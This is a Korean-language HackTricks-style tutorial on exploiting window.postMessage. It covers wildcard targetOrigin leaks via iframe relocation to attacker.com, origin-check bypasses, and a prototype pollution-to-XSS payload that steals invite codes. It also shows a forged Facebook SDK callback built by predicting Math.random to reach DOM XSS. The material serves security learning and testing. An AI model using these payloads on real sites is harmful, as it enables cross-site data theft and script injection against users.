# PostMessage 취약점

{{#include ../../banners/hacktricks-training.md}}

## 전송 **PostMessage**

**PostMessage**는 메시지를 전송하기 위해 다음 함수를 사용합니다:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Attacking iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`**는 JS에서 **`postMessages`를 기대하는** 함수를 선언할 때 사용하는 함수입니다.\
다음과 유사한 코드가 사용됩니다:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
주의: 이 경우 코드가 하는 **가장 먼저 하는 일**이 **origin을 확인하는 것**임에 주목하세요. 페이지가 수신된 정보를 사용해 **민감한 작업**(예: 비밀번호 변경)을 수행할 경우 이는 매우 **중요**합니다. **origin을 검사하지 않으면 공격자는 피해자가 임의의 데이터를 이 엔드포인트로 보내게 만들어**(이 예제에서는) 피해자의 비밀번호를 변경할 수 있습니다.

### 열거

현재 페이지에서 **event listeners**를 찾으려면 다음을 수행할 수 있습니다:

- **JS 코드에서 검색:** `window.addEventListener` 및 `$(window).on` (_JQuery 버전_)
- **개발자 도구 콘솔에서 실행:** `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **브라우저 개발자 도구에서 이동:** _Elements --> Event Listeners_

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) 또는 [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) 같은 **browser extension**을 사용하세요. 이러한 확장 기능은 모든 메시지를 **가로채서** 보여줍니다.

### Origin check bypasses

- **`event.isTrusted`** 속성은 genuine user actions로 생성된 이벤트에 대해서만 `True`를 반환하므로 안전한 것으로 간주됩니다. 올바르게 구현된 경우 우회가 어렵지만, 보안 검사에서 그 중요성은 큽니다.
- PostMessage 이벤트에서 origin 검증을 위해 **`indexOf()`**를 사용하는 것은 우회될 수 있습니다. 이 취약점을 보여주는 예는 다음과 같습니다:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`의 **`search()`** 메소드는 문자열이 아닌 정규식용입니다. regexp가 아닌 것을 전달하면 암묵적으로 정규식으로 변환되어 메소드가 잠재적으로 안전하지 않게 됩니다. 정규식에서 점(.)은 와일드카드로 작동하므로, 특수하게 조작된 도메인으로 검증을 우회할 수 있습니다. 예를 들어:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** 함수도 `search()`와 유사하게 정규식을 처리합니다. 정규식이 잘못 구성되면 우회에 취약할 수 있습니다.
- **`escapeHtml`** 함수는 문자를 이스케이프하여 입력을 정화하려는 목적입니다. 그러나 새로 이스케이프된 객체를 만들지 않고 기존 객체의 속성을 덮어씁니다. 이 동작은 악용될 수 있습니다. 특히, 제어 가능한 객체의 속성이 `hasOwnProperty`를 인식하지 않도록 조작할 수 있다면 `escapeHtml`은 기대대로 동작하지 않습니다. 이는 아래 예제에서 보여집니다:

- 예상 실패:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- escape 우회:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

이 취약점의 맥락에서, `File` 객체는 읽기 전용 `name` 속성 때문에 특히 악용 가능성이 있습니다. 템플릿에서 사용될 때 이 속성은 `escapeHtml`에 의해 정화되지 않아 잠재적인 보안 위험을 초래합니다.

- JavaScript의 `document.domain` 속성은 스크립트에 의해 도메인을 축약하도록 설정될 수 있어 동일한 상위 도메인 내에서 동일 출처 정책을 더 느슨하게 적용할 수 있습니다.

### e.origin == window.origin 우회

%%%%%%을 사용해 웹 페이지를 **sandboxed iframe**에 임베드할 때, iframe의 origin이 null로 설정된다는 점을 이해하는 것이 중요합니다. 이는 **sandbox attributes**와 보안 및 기능에 미치는 영향과 관련해 특히 중요합니다.

sandbox 속성에 **`allow-popups`**를 명시하면, iframe 내에서 열린 팝업 창은 부모의 sandbox 제한을 상속합니다. 즉, **`allow-popups-to-escape-sandbox`** 속성이 함께 포함되지 않는 한, 팝업 창의 origin 또한 `null`로 설정되어 iframe의 origin과 일치합니다.

따라서 이러한 조건에서 팝업이 열리고 iframe에서 팝업으로 **`postMessage`**를 통해 메시지가 전송되면, 송신 측과 수신 측 양쪽의 origin이 `null`로 설정됩니다. 이로 인해 **`e.origin == window.origin`**은 (`null == null`)로 true로 평가되며, iframe과 팝업이 동일한 origin 값 `null`을 공유하기 때문입니다.

자세한 내용 **읽어보세요**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source 우회

스크립트가 리스닝 중인 동일한 창에서 메시지가 왔는지 확인하는 것이 가능합니다(특히 **Content Scripts from browser extensions**가 메시지가 동일한 페이지에서 전송되었는지 확인할 때 흥미롭습니다):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
메시지의 **`e.source`**를 null로 만들려면 **iframe**을 생성해 **postMessage**를 **보내는** 상태로 만든 뒤 **즉시 삭제**하면 됩니다.

자세한 정보는 **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

이 공격들을 수행하려면 이상적으로 **put the victim web page**를 `iframe` 안에 넣을 수 있어야 합니다. 하지만 `X-Frame-Header` 같은 일부 헤더는 그 **동작**을 **방지**할 수 있습니다.\
그러한 상황에서는 덜 은밀한 공격을 사용할 수 있습니다. 취약한 웹 애플리케이션을 새 탭으로 열고 그것과 통신할 수 있습니다:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### main 페이지를 blocking하여 child iframe으로 전송된 메시지 훔치기

다음 페이지에서는 데이터를 전송하기 전에 **main** 페이지를 **blocking**하고, **child iframe**으로 전송된 **sensitive postmessage data**를 **XSS in the child**를 악용해 수신되기 전에 **leak the data**하는 방법을 확인할 수 있습니다:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe 위치 변경으로 메시지 훔치기

만약 다른 iframe을 포함하고 있으며 X-Frame-Header가 없는 웹페이지를 iframe할 수 있다면, 당신은 **change the location of that child iframe**, 따라서 그 iframe이 **postmessage**를 **wildcard**를 사용해 전송된 것을 받고 있다면, 공격자는 그 iframe의 **origin**을 자신이 **controlled**하는 페이지로 **change**하여 메시지를 **steal**할 수 있습니다:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage를 통한 Prototype Pollution 및/또는 XSS

`postMessage`로 전송된 데이터가 JS에서 실행되는 경우, 해당 **page**를 **iframe**하고 `postMessage`를 통해 익스플로잇을 전송하여 **prototype pollution/XSS**를 **exploit**할 수 있습니다.

A couple of **`postMessage`를 통한 매우 잘 설명된 XSS** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Example of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
For **자세한 정보**:

- 다음 페이지 링크: [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- 다음 페이지 링크: [**XSS**](../xss-cross-site-scripting/index.html)
- 다음 페이지 링크: [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### postMessage 브리지에서 **`Math.random()`** 콜백 토큰 예측

메시지 검증이 `Math.random()`으로 생성된 “shared secret”(예: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`)을 사용할 때(같은 헬퍼가 plugin iframe의 이름도 정한다면), PRNG 출력값을 복원하고 신뢰된 메시지를 위조할 수 있습니다:

- **Leak PRNG outputs via `window.name`:** SDK가 `guid()`로 plugin iframe에 자동 이름을 부여합니다. 상위 프레임을 제어할 수 있다면, 피해자 페이지를 iframe으로 띄운 뒤 plugin iframe을 공격자 도메인으로 네비게이트(예: `window.frames[0].frames[0].location='https://attacker.com'`)하고 `window.frames[0].frames[0].name`을 읽어 원시 `Math.random()` 출력을 얻을 수 있습니다.
- **Force more outputs without reloads:** 일부 SDK는 reinit 경로를 노출합니다; FB SDK에서는 `{xfbml:1}`을 포함한 `init:post`를 트리거하면 `XFBML.parse()`가 강제 실행되어 plugin iframe을 파괴/재생성하고 새로운 이름/콜백 ID를 생성합니다. 반복적인 reinit으로 필요한 만큼 PRNG 출력을 얻을 수 있습니다(콜백/iframe ID용 내부 `Math.random()` 호출이 추가로 있으므로, 예측자는 중간 값을 건너뛰어야 합니다).
- **Trusted-origin delivery via parameter pollution:** 퍼스트파티 plugin 엔드포인트가 교차-윈도우 페이로드에 정제되지 않은 파라미터를 반사하면(예: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), 신뢰된 `facebook.com` 출처를 유지하면서 `&type=...&iconSVG=...` 같은 값을 주입할 수 있습니다.
- **Predict the next callback:** leaked iframe 이름을 `[0,1)`의 부동소수점으로 복원하고 여러 값(비연속 값 포함)을 V8 `Math.random` 예측기(e.g., Z3 기반)에 넣어 다음 `guid()`를 로컬에서 생성해 기대되는 콜백 토큰을 위조합니다.
- **Trigger the sink:** postMessage 데이터를 조작해 브리지가 `xd.mpn.setupIconIframe`을 디스패치하도록 하고 `iconSVG`에 HTML을 주입(예: URL-encoded `<img src=x onerror=...>`)하면 호스팅 출처 내부에서 DOM XSS를 달성할 수 있습니다; 거기서 same-origin iframe(OAuth dialogs, arbiters 등)을 읽어올 수 있습니다.
- **Framing quirks help:** 이 체인은 framing을 요구합니다. 일부 모바일 webview에서는 `frame-ancestors`가 존재할 때 `X-Frame-Options`가 지원되지 않는 `ALLOW-FROM`으로 저하될 수 있으며, “compat” 파라미터가 관대하게 설정된 `frame-ancestors`를 강제해 `window.name` 사이드 채널을 가능하게 합니다.

#### 최소 위조 메시지 예시
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 참고자료

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- 연습용: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
